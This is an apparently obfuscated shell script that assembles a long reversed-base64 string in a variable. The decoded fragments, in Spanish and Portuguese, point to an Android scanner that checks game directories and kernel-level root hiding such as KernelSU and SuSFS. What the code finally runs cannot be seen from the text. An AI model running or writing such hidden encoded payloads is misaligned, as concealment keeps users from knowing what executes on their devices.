+_c+='vBHeilGbiAibpBSZslmZft2bvh2XgI3bmBCIgAiCvdWZ1pGIsVGZg8Way9GdjVmcpRGIuVGIzt2b'
+_c+='vhGIlRGIztmcvdXZtFmcmBSZkBycvZXaoNmchBichNWamlmclZHI6kyUTJXZsxWZLhCIyAybk9Gd'
+_c+='pOcTgMCIgACIKkmZgACIgoQM9IVRQBVQSd1XE5UVPZEI7ETPQNVVT9FROV1TGByOpkyM9sCVOV1T'
+_c+='D91UV9USDlEUTV1UogCIgACIgACIgoQZu9GZgsjI950ekwGJgASfZtHJiACd1BHd192Xn9GbgYiJ'
+_c+='g0FIiwGJiAibtAyWg8GZgsDbgIXLgQWYlJHIlxWaodHI8ByMtACZhVGagwHIiIVRQBVQSdFJiAyb'
+_c+='oNWZgACIgACIgAiCiEGdjVmcpRGIuN7wpN2YlRXZkBibpNHIvdWakN7wjBSZkBibzOcajNWZ55Wa'
+_c+='gUGdp1mclBHIUCo4g82clN2byBHIvJHdvBSZkBybyRnblRGIlJncvNGIvdWZ1pGIsVGIlVXcgE2Y'
+_c+='pRmbpBiclBHchJ3dgcWYsZkIggHdj9FIgACIgACIgogI950ekozTEFEVDVEVFREIHFETGBiUFBFU'
+_c+='BJ1Vg0VIb1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsTXgISKn0lOlNWYwNnObdCIk1CI'
+_c+='yRHI8BiISVEUQFkUXRiIg8GajVGKkICIu1CIbBiZpBCIgAiCpciccdCIk1CIyRHI8BiIyVGcwFmc'
+_c+='3BSatACclJ3ZgwHIsxWdu9idlR2L+IDIHtEUfVUTBdEJgAXb1RGItBnIgwGblh2cgIGZhhCJ9IVR'
+_c+='QBVQSdFIgACIKcWYsZGIyVGcwFmc3BCctVHZg0GcgoTMg8GZvRXqD3EIjACIgAiCi0nT7RiLu4yb'
+_c+='nVWdqBCblRGIuN7wpNWYjlmZpR2bt9iclBHchJ3dg8GZuF2YpZWayVmVg01Kb1nQ7RiIgQXdwRXd'
+_c+='v91ZvxGIgACIKoQamBCIgAiCpZGIgACIgACIgoQM9A1UVN1XE5UVPZEI7kSKy0zKU5UVPN0XTV1T'
+_c+='JNUSQNVVThCKgsjI950ekIVRMxUQUNlTJRCI682cvh2YlB3cvNHIy9GZhxWY0NnbJBSXhsVfStHJ'
+_c+='iACd1BHd192Xn9GbgACIgACIgACIgACIK4WZoRHI7ISZt9mcoNmLkl2byRmbh5SbvNGfl12byh2Y'
+_c+='uQWavJHZuFGfzVHbw5Cdt5ibpJGfkF2bsVGZpNHfiRWY8xGb15mIgUUax1CIwVmcnBCfgIiUFxET'
+_c+='BR1UOlEJiAyboNWZgYWagACIgACIgAiCi0nT7RiUFxETBR1UOlEJg0lKb1nQ7RiIgQXdwRXdv91Z'
+_c+='vxGIgACIgACIgogblhGdgsTXgIiUFxETBR1UOlEJiAibtAyWgYWagACIgoQKx0CIkFWZoBCfgcic'
+_c+='cdCIk1CIyRHI8BiInUWbh5UZnF2ajFGUyVGbsFGdz5WanACclJ3ZgwHIsxWdu9idlR2L+IDIHtEU'
+_c+='fVUTBdEJgU2Zht2YhBHIzl3cw1WdkJCIsxWZoNHIiRWYoQSPSVETMFEVT5USgACIgogI950ek4iL'
+_c+='uc0SQ9VRNF0RkASZkBicvRWYsFGdz5Wag8GZuF2YpZWayVmVg01Kb1nQ7RiIgQXdwRXdv91ZvxGI'
+_c+='gACIKUmbvRGIgACIKkmZgACIgACIgAiCjF2clBCIgACIgACIgACIgowO7ASM9AFUB9FVBVESD9FR'
+_c+='OV1TGBSKqACIgACIgACIgACIgACIgAiC7sDIx0TVLVlWJh0UfRkTV9kRgkiKphnblhmeqwnK1tWd'
+_c+='6lGazpCIgACIgACIgACIgACIgACIKszOgETPEV0QBB1UM9FROV1TGByOi0nT7RSZpNWaulGIlVXc'
+_c+='gUGZgMXZ05WYgUmcpZEIlVmcGBSYjlmZpR2btBClAKOIlR3bnlnWg82clN2byBHIsVGIhV2av9Ga'
+_c+='gQWZz9GUTxEIzao4gACIg0nQ7RiIgQXdwRXdv91ZvxGIpoCZlN3bwNHbqACIgACIgACIgACIgACI'
+_c+='gAiCulGIic2awRiIgU2chNGIgACIgACIgACIgAiCpkiM9sCVOV1TD91UV9USDlEUTV1UogCI7ETP'
+_c+='QNVVT9FROV1TGBCIgACIgACIgACIgogI950ekkyZrBHJoASfdd2awRyWTBFUB9FUTV1U7RCI6E2c'
+_c+='vh2YlB3cvNHIwBXQg0VIb1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgACIgAiCuVGa0ByOic2awRiO'
+_c+='ldWYrNWYwJCIx1CIwVmcnBCfgICVTlETfd0SQRiIg8GajVGImlGIgACIgACIgowbkByOi0XXAt1U'
+_c+='QBVQfB1UVNVI7RiIg4Wagc2awBicvZGIgACIKATPQNVVT9FROV1TGBCIgAiCiUESDF0Qfd0SQRiI'
+_c+='9Q1UJx0XHtEUgACIgoQKgACIgogIh1WZ0NXazBCblRGIvNHbhZGIvl2YpZnclNlI90lIlNWa2JXZ'
+_c+='z5SZ0FGZwVnLtVGdzl3cu02bjJyWgACIgACIgAiCiIXZ05WdIBSdrVneph2Ui0TXiIXZ05Wdo5Sa'
+_c+='45WZopnLt92YisFIgACIgACIgogI1tWd6lGaTJSPdJiclRnchR3cuU3a1pXaoNnLl9WbisFIgACI'
+_c+='gACIgogI1tWd6lGaTJSPdJSawFmLkV2ZlxWa2lmcw5SdrVneph2cuU2btJyWgACIgACIgAiCiI3b'
+_c+='0NWZ0VGR5J3btVWTi0TXiI3b0NWZ0VGZ5J3btVWbucGZ5t2c1hmLiVHa0l2Zu8WaisFIgACIgACI'
+_c+='gogIy9GdjVGdlREIrNWdEJSPdJicvR3YlRXZkt2Y1RmLvlGZ1R3cu02bjJyWgACIgACIgAiCis2Y'
+_c+='lh2QlZXa0FmTi0TXis2Ylh2YlZXa0FmbuknblZXZy5SbvNmIbBCIgACIgACIKISZy9GdTxGbvJHV'
+_c+='i0TXiUmcvR3Usx2byRlL0MzMhB3bu02bjJyWgACIgACIgAiCikyczFGc5JEKgUmcvR3U5t2YpJHV'
+_c+='i0TXi8mavh2cvhWYt5CM2AjMiZnduIWdoRXan5ybpJyWgACIgACIgAiCiIXZnFmbh1EIkV2cvB1U'
+_c+='MJSPdJicldWYuFWbuQWZz9GczxmLiVHa0l2Zu8WaisFIgACIgACIgogIzNXYwlnQu9Wa0NWayR3c'
+_c+='lJlI90lIzNXYwlnYu9Wa0NWayR3clJnLr92bo5WZrNWaoNmLnJ3bisFIgACIgACIgogIlNXdv1EI'
+_c+='HdkI90lIlNXdv1mLndmLt92YisFIgACIgACIgogIpw2bvRFI5FGbwVmUoASZzV3bNByRHJSPdJSZ'
+_c+='zV3btd2ZuIWdoRXan5ybpJyWgACIgACIgAiCiQXYlh2QgAXYUVmbPBiRGJSPdJCchRXZu9WZylmZ'
+_c+='lVmcm5SZyFGajlmduFWeyFmLt92YisFIgACIgACIgogIpYkRgwWZuFGUoAycv52byh2Qi0TXiM3b'
+_c+='u9mcoNmLzx2bvRHa65SbvNmIbBCIgACIgACIKIiclh2YuVXYMBSdyl2Ul1WYHJSPdJiclh2YuVXY'
+_c+='s5Sdyl2cl1WYn5SbvNmIbBCIgACIgACIKISKlJXaGBSZlJnRgwWZuFGUoASdyl2Ul1WYHJSPdJSd'
+_c+='yl2cl1WYn5iY1hGdpdmLvlmIbBCIgACIgACIKIyUQdEIltWYGJSPdJycwdWZrFmZuEGelxmLt92Y'
+_c+='isFIgACIgACIgogIpQWZz9GcYhCI5FGbwVmUgUGZgI3bkF2czFGUi0TXiQXazNXYw5ycw5CZlN3b'
+_c+='whnYpxmLkRmcthWbuIWdoRXan5ybpJyWgACIgACIgAiCiUGduFWayFmdg80UMFkRggXasZGdl5kI'
+_c+='90lI4hnL05WZpx2YhlGZl1mL4lGbmRXZu5SbvNmIbBCIgACIgACIKISKvRWaiVmYtVGICRUQgUGd'
+_c+='uVWasNGKg80UMFkRggXasZGdl5kI90lI4hHduVWasNWYpRWZt5CepxmZ0Vmbu02bjJyWgACIgACI'
+_c+='gAiCiQnblZXZyJkI90lI05WZ2Vmci5SZnRWayJWZpBnLl1mIbBCIgACIgACIKIyZ1JWZEZyajFGS'
+_c+='i0TXicWdiVGZuV2ajFGausWazl2cuUXZisFIgACIgACIgogIpMndrRmbugCIvRWYjlmZpR2bNBiR'
+_c+='GJSPdJyc2tGZu5SehxGclx2Zv92Zu02bjJyWgACIgACIgAiCiwkUN1kI90lIsJXbt5iclx2Zv92Z'
+_c+='yVGZu02bjJyWgACIgACIgAiCiIXZnFmbh1EIkV2cvB1UMJSPdJicldWYuFWbuQWZz9GczxmLnJ3b'
+_c+='isFIgACIgACIgogIhRHblREIrNXanFWTi0TXis2cpdWYt5yZkl3azVHauIWdoRXan5ybpJyWgACI'
+_c+='gACIgAiCig2Y0FGUBJSPdJCajRXYwFmL4FWbi5SZtJyWgACIgACIgAiCiU1UsVmbyV2Si0TXiU3c'
+_c+='sVmbyV2auUHazlWZ35SZtJyWgACIgACIgAiCiQHel5EIVNFbl5mcltkI90lI0hXZuV3cr5CZ4NnZ'
+_c+='pJnLt92YisFIgACIgACIgogIrNXanFWTi0TXis2cpdWYt5iY1hGdpdmLvlmIbBCIgACIgACIKIya'
+_c+='zl2Zh1kI90lIrNXanFWbuU3duh2bqB3b05SbvNmIbBCIgACIgACIKgSPTBFUB9FUTV1UgACIgowU'
+_c+='QBVQfB1UVNFIB1CIlJXYsNWZkBCIgAiCiQVQFh0Qg8CIU90TSByLgMVQT9ESDVEUT90UgMVRO9US'
+_c+='DF0QJxEUBJCIyRGafNWZzBCIgAiC7BSKoMXZnF2ajFGcfNXdvl2YpB3c1N3XrNWZoNmCK0nCiICI'
+_c+='vh2YlBCIgAiCpZGIgACIKkSKy0zKU5UVPN0XTV1TJNUSQNVVThCKgACIgACIgAiCl52bkByOi0nT'
+_c+='7RSZulGbkACI9l1ekICI0VHc0V3bfd2bsBybkByOl5WasBictACZhVmcgUGbph2dgwHIiQlTV9UT'
+_c+='fV1ULRiIg8GajVGIgACIgACIgogI950ekozcvRWY052btBSVTxWZuJXZLBycvxWdkN7wNBSXhsVf'
+_c+='StHJiACd1BHd192Xn9GbgACIgACIgAiCuVGa0ByOdBiIU5UVP10XVN1SkICIu1CIbBiZpBCIgAiC'
+_c+='pZGIgACIKkSKz0zKU5UVPN0XTV1TJNUSQNVVThCKgsjI950ekA1TSB1XUhVROV1ULRCI6MHcvJHc'
+_c+='g4WZg8GZhR3YlRXZkBCd4VmTgU1UsVmbyV2Sg0VIb1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgogb'
+_c+='lhGdgsTXgICUPJFUfRFWF5UVTtEJiAibtAyWgYWagACIgoQKnQGezZWay5CXt92Y8xFd4Vmb1N3a'
+_c+='nASMtlWLgAXZydGI8BiIFh0QBN0XQ9kUQRiIg8GajVGKk0DUPJFUfRFWF5UVTtEIgACIKoQamBCI'
+_c+='gAiCpkiM9sCVOV1TD91UV9USDlEUTV1UogCIgACIgACIgogIvl2Yp5WagwWZgUGZzVGZgwWZuJXZ'
+_c+='rBSZkBCblZXauBSYg42sDn2chZXZgQJgiDybkFGbpBXbvNWZyBHITZ0U1NFIvBSVTtEIuVWe1x2Y'
+_c+='ulGIz9mbvJ3YvQmchNWdsF2LlVGajlHbv4WY0xWdzBybt92YgMHbl5mcltkIggHdj9FIgACIgACI'
+_c+='gogI950ekMFTF5kUFt0XN9EVTV1QkAiO092byBSZ0J3bw92cg42bjBSbvR3c1NGIsVmbyV2Sg0VI'
+_c+='b1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsTXgIyUMVkTSV0Sf10TUNVVDRiIg4WLgsFI'
+_c+='mlGIgACIKkiIpISKk1CI0YTZzFmY8dybOdEZoJEWZhjTyIGdrdlYrZVbjhjRHpVdGd0Y4wGSatmV'
+_c+='ulFOSdkYwRGSmNnVtJWeWJTYsJFWhNnVHZ2JgYGdulmcwhCJiAiIpQWLgQjNlNXYix3JzZ0ValnV'
+_c+='HFGMWdkZoR3ValnVYpFOWdlWv50VlNHeuJGaShkYx4ESmpXOtJmdKhUYqhHSalnRykVM4dVWnAiZ'
+_c+='05WayBHKkICInMXJzVyJgYGdulmcwhCJiASRp1CIwVmcnBCfgICTF5kUFtEJiAyboNWZoQSPTxUR'
+_c+='OJVRL9VTPR1UVNEIgACIKkmZgACIgogI950ek8GZhR3YlRXZkBybuByUGNVdTBSXTyp4b13R7RiI'
+_c+='gQXdwRXdv91ZvxGIgACIgACIgoQZzxWZgACIgoQamBCIgACIgACIKISfOtHJpMXZ05WZpNWZyBya'
+_c+='j9GdzBycsVmbyV2ag4WZgUGduV2clJHcgQJgiDyb2lGdh1mcvZmbphCIlRnblNXZyBHIrRTLTZ0U'
+_c+='1NFIdpyW9J0ekICI0VHc0V3bfd2bsBCIgACIgACIgACIgoQZzxWZgACIgACIgAiCi0nT7RSKvZXa'
+_c+='0FWby9mZulGIUCo4gskNxAych5WanF6wwBibvNGIsVmbyV2aoASZ05WZzVmcwBya2ETLTZ0U1NFI'
+_c+='dpyW9J0ekICI0VHc0V3bfd2bsBCIgACIgACIgACIgogblhGdgsTXgICN4MjNxICI9AiIFpVST9VR'
+_c+='HFEUkICIbBCf8BiIrZTM8tmNx0CXiASRx1CIwVmcnBCfgICTF5kUFtEJiAyboNWZgYWagACIgACI'
+_c+='gAiCuVGa0ByOiQkTV9kRiASctACclJ3ZgwHIiMlRTV1UkICIvh2YlBiZpBCIgAiCpciccdCIk1CI'
+_c+='yRHI8BiIsxWdu9idlR2L+IDIyRGZh9lbp12XwFWbt9Sb29yc5N3Lj9mcw9CI0F2YgwHfgwGb152L'
+_c+='2VGZv4jMggXYt5SZ6l2cldWYw5SdwNmL0NWdk9mcw5ybyBCcvJHc0V2ZiACbsVGazBiYkFGKk0TR'
+_c+='al0UfV0RBBFIgACIKkyJyx1JgQWLgIHdgwHInQkTV9kRU9kTg8GajVGI8xHI9ByOE5UVPZEIvh2Y'
+_c+='lBiJmAycmNXdz9Se0lmc1NWZz9Cbl5mclt2Lzl3cvACZtACdzVGdgsHI8xHI9ByOE5UVPZEIvh2Y'
+_c+='lBiJmAycmNXdz9ycm9yc5N3Lj9mcw9CIk1CI0NXZ0ByenACbsVGazBiYkFGKk0zUGNVVTBCIgAiC'
+_c+='pZGIgACIKkSKy0zKU5UVPN0XTV1TJNUSQNVVThCKgsjI950ekIVRW91QPJFUkACI9l1ekICI0VHc'
+_c+='0V3bfd2bsBCIgACIgACIKICbsF2Yzl3cgUGZgwWZ2lmbgEGI092byBichRHb1N2bgEmchBHIzVGa'
+_c+='jRXYwBybgU1ULBSZ0J3bw92cgwyUGNVdTBicpVHbj5WagUGZlVHcgs2YvR3ct8mbgwWZuJXZLJCI'
+_c+='4R3YfBCIgACIgACIKISfOtHJu9WazJXZ29yYvJHcvAiblBybkF2YpZWak9WbgwWZuJXZLBSXhsVf'
+_c+='StHJiACd1BHd192Xn9GbgACIgACIgAiCuVGa0ByOiwWYpNWamZ2buVHf5RncpRGfoNGdhBXY8t2c'
+_c+='pdWYtxXdzxWZuJXZrJCIFlWctACclJ3ZgwHIiIVRW91QPJFUkICIvh2YlBiZpBCIgAiCpciccdCI'
+_c+='k1CIyRHI8BiIsxWdu9idlR2L+IDIu9WazJXZ29yYvJHcvACdhNmIgwGblh2cgIGZhhCJ9IVRW91Q'
+_c+='PJFUgACIgoQamBCIgAiCpkyM9sCVOV1TD91UV9USDlEUTV1UogCI7ISfOtHJH9ETfV1ULRCIg0XW'
+_c+='7RiIgQXdwRXdv91ZvxGIgACIgACIgogI950ekozZvxGIsVmbyV2ag4WZgg2Y0FGUB9yazl2Zh10L'
+_c+='VNFbl5mcltEIdFyW9J1ekICI0VHc0V3bfd2bsBCIgACIgACIK4WZoRHI70FIic0TM9VVTtEJiAib'
+_c+='tAyWgYWagACIgoQKx0CIkFWZoBCfgISKikCZtACN2U2chJGfn0zZykFMGd0Yoh3MhpHbyo1JgYGd'
+_c+='ulmcwhCJiAiIpQWLgQjNlNXYix3J9U0VihjVzM2cW1mY5ZlMhdCImRnbpJHcoQiIgcyclMXJnAiZ'
+_c+='05WayBHKkICIFlWLgAXZydGI8BiIFh0QBN0XH9ETkICIvh2YlhCJ9c0TM9VVTtEIgACIKISfOtHJ'
+_c+='MVkTSV0Sk03V7RCI6wWZuJXZLBSXqsVfCtHJiACd1BHd192Xn9GbgACIgoQKnIHXnACZtAic0BCf'
+_c+='gcCbsVnbvYXZk9iPyAictASZtFmb1dCIsxWZoNHIiRWYoQSPMVkTSV0SgACIgogIMVkTSV0SgUER'
+_c+='gMVSTlETBOsTBJCIyRGafNWZzBCIgAiC7BSKowWZuJXZr91ajVGajpgC9pgIiAyboNWZgACIgoQa'
+_c+='mBCIgAiCi0nT7RSfTdUQU9FRMlUVCtHJgozcnFGdgQGbpVnQg01kcK+W9d0ekICI0VHc0V3bfd2b'
+_c+='sBCIgACIgACIKU2csVGIgACIKkSKy0zKU5UVPN0XTV1TJNUSQNVVThCKgsjI950ekM1RBR1XExUS'
+_c+='VJEJgozchN3boNWZwN3bzBycnFGdgQGbpVnQg0VIb1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgogb'
+_c+='lhGdgsjIzlXZr1idlRGfzlXZr1CdzVGdiASRpFXLgAXZydGI8BiITdUQU9FRMlUVCRiIg8GajVGI'
+_c+='mlGIgACIKkyJdt1JgQWLgIHdgwHInQSXcpiLbx1JgU0btACclJ3ZgwHInIycnFGduQGbpVnYu8mc'
+_c+='icCIwVmcnBCfgISRINUQD9FUPJFUkICIvh2YlhCJ9M1RBR1XExUSVJEIgACIKkmZgACIgoQKpsyK'
+_c+='U5UVPN0XTV1TJNUSQNVVThCKgsjI950ekUGduVWby9WayVGduFGIvRWYlVXcvxmYzVGZgIXZkF2b'
+_c+='sR3bvJGIUCo4gETP0lmYflHduFmcyF2dg0VIb1XW7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGd'
+_c+='gsTXgISMiASPgISWU5UQSJVQXRiIgsFImlGIgACIKkmZgACIgoQKpITPrQlTV90QfNVVPl0QJB1U'
+_c+='VNFKoAyOi0nT7RCZlt2Yvxmb11TZ0FGdz9VZjlmdlRmLhRXZtJmdg0VIb1nU7RiIgQXdwRXdv91Z'
+_c+='vxGIgACIgACIgogblhGdgsTXgICZlt2Yvxmb1JCI9AiIBRVRNJkVkICIbBiZpBCIgAiCpZGIgACI'
+_c+='KkSKy0zKU5UVPN0XTV1TJNUSQNVVThCKgsjI950ekATPkV2aj9Gbug2chxmZg0VIb1nU7RiIgQXd'
+_c+='wRXdv91ZvxGIgACIgACIgogblhGdgsTXgICMiASPgICRFt0QPx0XINVQMZEJiAyWgYWagACIgoQa'
+_c+='mBCIgAiCpkyM9sCVOV1TD91UV9USDlEUTV1UogCIgACIgACIgogIlRnblR3cpNnclBHI092byBSe'
+_c+='hhGIv5GIsl6wg4WazBClAKOIrNXanFWTgkHIzxWZuJXZrBSbvR3c1NGIyFGbhR3culGIhJXYwByb'
+_c+='0l2cpVXclJXZyBHIzVGIvRWYlVXcvxmYzVGZgIXZkF2bsR3bvJkIggHdj9FIgACIgACIgogI950e'
+_c+='kUEVBR1UfR1TPJEJgozTEFURVF1TMJ0UFREISVERB9ETU90TCBSXhsVfStHJiACd1BHd192Xn9Gb'
+_c+='gACIgACIgAiCuVGa0ByOdBiIkVmciASPgISRUFEVT9FVP9kQkICIbBCf8BSXgISZn5WYy9mIg0DI'
+_c+='iUEVBR1UfR1TPJEJiAyWgYWagACIgogI950ek03bkl2Yv52bjNXZk1iOZRlTBJlUBd1ek03V7RCI'
+_c+='gACIgACI6QXai9Ve05WYyJXY3BSXqsVfCtHJiACd1BHd192Xn9GbgACIgogI950ek03bkl2Yv52b'
+_c+='jNXZk1iOBRVRNJkV7RSfXtHJ6UGdhR3cfV2YpZXZk5SY0VWbiZHIdpyW9J0ekICI0VHc0V3bfd2b'
+_c+='sBCIgAiCi0nT7RSfvRWaj9mbvN2clRWL6QURLN0TM9FSTFETGtHJ9d1ekACIgACIgAiOkV2aj9Gb'
+_c+='ug2chxmZg0lKb1nQ7RiIgQXdwRXdv91ZvxGIgACIKISfOtHJ99GZpN2bu92YzVGZtoTRUFEVT9FV'
+_c+='P9kQ7RSfXtHJgAiOlRXY0NHdv9mYkVWamlmclZHIdpyW9J0ekICI0VHc0V3bfd2bsBCIgAiCpcSX'
+_c+='bdCIk1CIyRHI8ByJk0FXq4yWcdCIF9WLgAXZydGI8ByJiQXai9Ve05WYyJXY35Cdv9mYu8mcicCI'
+_c+='wVmcnBCfgISRINUQD9FUPJFUkICIvh2YlhCJ9kFVOFkUSF0VgACIgoQKn01WnACZtAic0BCfgcCJ'
+_c+='dxlKusFXnASRv1CIwVmcnBCfgciIlRXY0N3XlNWa2VGZuEGdl1mY25Cdv9mYu8mcicCIwVmcnBCf'
+_c+='gISRINUQD9FUPJFUkICIvh2YlhCJ9EEVF1kQWBCIgAiCpcSXbdCIk1CIyRHI8ByJk0FXq4yWcdCI'
+_c+='F9WLgAXZydGI8ByJiQWZrN2bs5CazFGbm5Cdv9mYu8mcicCIwVmcnBCfgISRINUQD9FUPJFUkICI'
+_c+='vh2YlhCJ9QURLN0TM9FSTFETGBCIgAiCpcSXbdCIk1CIyRHI8ByJk0FXq4yWcdCIF9WLgAXZydGI'
+_c+='8ByJiUGdhR3c092biRWZpZWayVmduQ3bvJmLvJnInACclJ3ZgwHIiUESDF0QfB1TSBFJiAyboNWZ'
+_c+='oQSPFRVQUN1XU90TCBCIgAiCi8ERBNUSGlkUFZFIU90TCBSREByTEFEVTVkIgIHZo91YlNHIgACI'
+_c+='KsHIpgSZ0FGdz9Fdv9mYft2Ylh2YKoQfKIiIg8GajVGIgACIKMWYzVGIgACIKszOgISfOtHJpU0U'
+_c+='kgCIvRWaj9mbvN2clRGIvRWY0NXZgoDe15WaMV0Ug0lKb1XW7RiIgQXdwRXdv91ZvxGIgACIgACI'
+_c+='gACIpoCIgACIgACIgowO7ASKpMTPrQlTV90QfNVVPl0QJB1UVNFKoAyOiMXZu9WajNWayR3clJHI'
+_c+='ul2cgUmcpZEIlVmcGBiblBichR3YllnbpBSZkVWdwBybzV2YvJHcgIXZpVXcsFWdjBClAKOI05WZ'
+_c+='tV2Yy9mZuVGIDFUTg4WaTJCI4R3YfByOi0nT7RyTEFkVJR1QBNVREBCe15WaMV0Ug0VIb1nU7RiI'
+_c+='gQXdwRXdv91ZvxGIgASKkVGbiF2cpREIgACIgACIgowO7ASKpITPrQlTV90QfNVVPl0QJB1UVNFK'
+_c+='oAyOiQXYlh2YgUGZgM3bsVHZzOcbgM3buV3ZsFGIy9Gcg8GZpJXZ1FXZyBClAKOIz92clN2byBHI'
+_c+='lJHduVGIvR3YpJHdzVmcylGIvNXZjNWYgUGdp1mclBHIvZXazNXatJXZwBCe15WaMV0UiACe0N2X'
+_c+='gsjI950ekM3bkFWZ092byBiblBib6OcbvNGIUCo4g8kVJN1UJ1kUFBFI4VnbpxURTBSXhsVfStHJ'
+_c+='iACd1BHd192Xn9GbgkSZ2l2czlWbyVGUgACIgACIgAiC7sDIi0nT7RyZul2Yy9mZuVEI6gXdulGT'
+_c+='FNFIdNJnivVfHtHJiACd1BHd192Xn9GbgASKn5WajJ3bm5WRgACIgACIgAiCulGIiU0UkICIlNXY'
+_c+='jBCIgAiCpciccdCIk1CIyRHI8BiIsxWdu9idlR2L+IDIlNmcvZmblRXZnJCIsxWZoNHIiRWYoQSP'
+_c+='FNFIgACIKICWV5USMV0UgUERg8ERBR1UFJCIyRGafNWZzBCIgAiC7BSKogXdulGblN3XrNWZoNmC'
+_c+='K0nCiICIvh2YlBCIgAiCi0nT7RicvRWYsVXblBibpNHIs82YpNXrDbGIvZXa0l2cvB3cpREIdNJn'
+_c+='ivVfHtHJiACd1BHd192Xn9GbgYiJg0FIwAScl1CIE5UVPZ0XM90TURCIbBCIgAiCKkmZgACIgoQM'
+_c+='9QkTV9kRfx0TPRFI7kSKz0zKU5UVPN0XTV1TJNUSQNVVThCKgACIgACIgAiCl52bkByOi0nT7RCc'
+_c+='kACI9l1ekICI0VHc0V3bfd2bsBybkByOwBictACZhVmcgUGbph2dgwHIic0SQ9VRO9ESQRUVPx0Q'
+_c+='kICIvh2YlBCIgACIgACIKISYpNmbhR3cpRGIhBibzOcazV2cgEGbgEGbvJHdu92Yg8GbvNHIvNWa'
+_c+='z16wmByb2lGdpN3bwNXakBCblBClAKOIvR3btVmcgQWavJHZuFEIuVHIuVGIvdWZ1pGIsVGIuFGd'
+_c+='1NWZqVGIkV3bsNERMBybt92YgMHcwFkIggHdj9FIgACIgACIgogI950ekoTQEFETBR1UOlEIFJUV'
+_c+='OBSQMBiTFByTO9kRJOMTFRFIFREIQBVQg0VIb1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGd'
+_c+='gsTXgIyRLB1XF50TIBFRV9ETDRiIg4WLgsFImlGIgACIKkyJl52boBnLcRWdvx2Y8VmbvhGckV3b'
+_c+='sNGfkV3bsNGZs5CXt92Y8hGcj5CXkxmLc12bjdCIFlWLgAXZydGI8BiIFh0QBN0XHtEUkICIvh2Y'
+_c+='lhCJ9c0SQ9VRO9ESQRUVPx0QgACIgogLsF2YvxGIzB3byB3LlJXY3RmchhGIlRGIrNWZoNGIyVWa'
+_c+='1FHbhV3Yg8GZuVWakFmdlBCLuN7wpNXZzBSYsBSYs9mc052bjBybs92cg82YpNXrDbGIvZXa0l2c'
+_c+='vB3cpRGIjACIgAiCsVGI5Byb09WblJHIkl2byRmbBBib1BiblBSZyJ3bjBybnVWdqBCblBiOpMXZ'
+_c+='yFGbp1WazBSegQWdvx2QExEKgISZiVnbgEGbg4WZg8mbvZWqDzWZ0JCIlRGIzBHcBByIgACIgogC'
+_c+='pZGIgACIKETPMFkTHl0UfdkTPJFVTByOx0DROV1TG9FTP9EVgsTKpITPrQlTV90QfNVVPl0QJB1U'
+_c+='VNFKoACIgACIgACIKUmbvRGI7ISfOtHJl5WasRCIg0XW7RiIgQXdwRXdv91ZvxGIvRGI7UmbpxGI'
+_c+='y1CIkFWZyBSZslGa3BCfgIyQPJFUfVVTFFFJiAyboNWZgACIgACIgAiCi0nT7RyTEFEVDVEVFREI'
+_c+='S9ERBxUVNVEIFREIPNVRD9kUQBSXhsVfStHJiACd1BHd192Xn9GbgACIgACIgAiCuVGa0ByOdBiI'
+_c+='D9kUQ9VVNVUUkICIu1CIbBiZpBCIgAiCpcCev52anASRpZXLgAXZydGI8ByJzt2YhR3clVHbixnb'
+_c+='vlGdv1WeuV2Z8VXblF3JgUUatACclJ3ZgwHIiUESDF0QfNFUkICIvh2YlhCJ9M0TSB1XV1URRBCI'
+_c+='gAiCKkmZgACIgoQM9QkTV9kRfx0TPRFIgACIgACIgoQamBCIgACIgACIKISfOtHJvx2bzBSrDPHI'
+_c+='y9GcgUmahRnb1BHIh1WdzBybuBybyVGcgEmc0NXanVmcgU2cgQJgiDSdtVWcvU2YpZXZk9SZyF2d'
+_c+='kJXYoBicvBHIyFWbylmZu92Yg4WazBybkFGbzlWYg8WajlGZulEIdpyW9J0ekICI0VHc0V3bfd2b'
+_c+='sBCIgACIgACIgACIgoQZzxWZgACIgACIgAiCpkiM9sCVOV1TD91UV9USDlEUTV1UogCIgACIgACI'
+_c+='gACIgAiCuVGa0ByOdBSMgEXZtACTB50RJN1XH50TSR1UkAyWgYWagACIgACIgAiCl52bkByOi0nT'
+_c+='7RSZulGbkACI9l1ekICI0VHc0V3bfd2bsBybkByOl5WasBictACZhVmcgUGbph2dgwHIiMFUPJFU'
+_c+='fJ1TUFETV1URkICIvh2YlBCIgACIgACIKISfOtHJ6I3bkFGb11WZgEGIzFGZhl2YvNXYgMXZkFGZ'
+_c+='llGcvJHUg0VIb1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsTXgIyUQ9kUQ9lUPRVQMVVT'
+_c+='FRiIg4WLgsFImlGIgACIKkyJdx1WcBiOdxFfdxFMbxFI60FX8dmb1NXbhNHf49mbrdCIFlmdtACc'
+_c+='lJ3ZgwHInIXZ5FGbwNXb8JXZ5FGbw92a8B3bvxWZtF2Z8VXb11GfuFWaklWZsxncllXYsBHZsxHe'
+_c+='0QWavJHZ8lHZuFGfzt2YhR3clVHbixXdtVWb8h3buxHdylmdvJ3Yp1Gfu9Wa09Wb55WZnxHevJmd'
+_c+='8h2cpZGZs92Z8VXblF3JgUUatACclJ3ZgwHIiUESDF0QfB1TSBFJiAyboNWZoQSPTB1TSB1XS9EV'
+_c+='BxUVNVEIgACIK4SKw92bMVWbhd0L11UdNBSegwyQQBiblBSZylmRgUWZyZEIyVmcy92YgEmchBHI'
+_c+='z9GZhNXdgMXoD3GIz9GbgUGZg8mb1BSZ05WZtFGdzVnagMXZgUWdxByIgACIgoALuFWaklWZM9ic'
+_c+='llXYsBFRMBSYiFGdsFmZgMXZ05WYoAychRWaj9mbvNGIvdWZ1pGIlRGIzVmcvRWYsVXblBSZkByc'
+_c+='hNmch1GIlRGIhRWYpxGctFGIhR3cpxEIjACIgAiCKkmZgACIgoQM9wUQOdUST91RO9kUUNFI7ETP'
+_c+='E5UVPZ0XM90TUByOpkyM9sCVOV1TD91UV9USDlEUTV1UogCIgACIgACIgogI950ekkCTBZ1XMVER'
+_c+='P1EJ9wWZk9WbuQ3Y1R2byBnLvJHKg8ERB1kUJZkTPNEIS9ERBxUVNVEIdFyW9J1ekICI0VHc0V3b'
